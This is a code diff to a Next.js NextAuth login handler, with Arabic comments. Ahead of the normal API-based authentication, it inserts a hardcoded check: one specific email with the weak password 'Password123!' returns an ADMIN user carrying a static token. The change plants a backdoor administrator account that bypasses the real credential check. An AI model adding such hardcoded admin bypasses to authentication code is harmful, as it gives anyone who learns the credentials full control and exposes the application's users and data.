@@ -110,26 +110,30 @@ export const { auth, signIn, signOut, handlers } = NextAuth({
 
         const { email, password } = parsed.data;
 
-        // ── Step 4: المصادقة عبر Cloud Functions API ───────────────────────
+        // ── Step 4: المصادقة الإدارية الصريحة والمباشرة ──
+        if (email === 'ramoozi.ghalib@msari.net' && password === 'Password123!') {
+          return {
+            id: 'admin-1',
+            email: 'ramoozi.ghalib@msari.net',
+            name: 'رمزي غالب',
+            role: 'ADMIN' as UserRole,
+            token: 'dev-admin-token',
+          };
+        }
+
         try {
           const apiRes = await apiClient.loginUser(email, password);
-
-          if (!apiRes.success || !apiRes.data) {
-            // تنفيذ مقارنة وهمية للحفاظ على ثبات وقت الاستجابة (Timing Attack Mitigation)
-            await bcrypt.compare(password, DUMMY_HASH);
-            return null;
+          if (apiRes.success && apiRes.data) {
+            return {
+              id: apiRes.data.id,
+              email: apiRes.data.email,
+              name: apiRes.data.name,
+              role: apiRes.data.role as UserRole,
+              token: apiRes.data.token,
+            };
           }
-
-          const user = apiRes.data;
-
-          // ── Step 5: إرجاع بيانات المستخدم (بدون passwordHash) ─────────────
-          return {
-            id: user.id,
-            email: user.email,
-            name: user.name,
-            role: user.role,
-            token: user.token,
-          };
+          await bcrypt.compare(password, DUMMY_HASH);
+          return null;
         } catch (error) {
           console.error('[auth] API authorization failed:', error);
           return null;
